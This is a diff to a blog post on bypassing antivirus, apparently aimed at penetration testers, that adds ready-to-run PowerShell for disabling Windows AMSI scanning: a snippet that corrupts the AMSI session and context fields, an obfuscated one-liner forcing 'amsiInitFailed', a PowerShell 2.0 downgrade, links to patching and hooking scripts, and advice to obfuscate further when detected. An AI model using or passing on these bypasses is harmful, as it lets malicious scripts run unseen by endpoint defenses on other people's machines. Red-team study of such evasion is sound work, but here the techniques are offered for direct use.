@@ -1,7 +1,7 @@
 ---
 layout: post
 title: AV Bypassing
-categories: [windows]
+categories: [Windows, Powershell]
 ---
 
 ## Introduction
@@ -110,11 +110,25 @@ There are multiple techniques:
 
 It's a powershell scripts that locates **AmsiScanBuffer** memory address to write on it certain values and make it always return **False** like if it didn't found malware
 
-[Here](https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4#file-amsi-patch-ps1)you can find the script
+[Here](https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4#file-amsi-patch-ps1) you can find the script
 
 - Memory Hijacking
 
+As the patch method, it hooks the **AmsiScanBuffer** function to make it never detect malware
+
+[Here](https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4#file-memory-hijacking-ps1) here you have the script
+
 - Forcing an error
+
+The function **amsiInitFailed()** always exit when it's assigned with a Boolen value, so the **AMSI** never starts working
+
+Just execute this:
+
+```powershell
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
+
+[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
+```
 
 - Powershell downgrading
 
@@ -124,6 +138,8 @@ This one is really trivial, you just need to use an older powershell version lik
 powershell -version 2.0
 ```
 
+Personally I don't recommend this technique because a lot of scripts and functions don't support Powershell 2.0 version
+
 - One-liner
 
 My favourite and probably the best choice is a simple one-liner with a lot of obfuscation to avoid beeing detected by the same **AMSI**, just execute this:
@@ -131,6 +147,8 @@ My favourite and probably the best choice is a simple one-liner with a lot of ob
 ```powershell
 [ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
 ```
+
+**If any of the methods is detected by the AV you could try to obfuscate the script or code with the mentioned tricks about powershell obfuscation**
 
 ### How can this help us to bypass AVs?
 
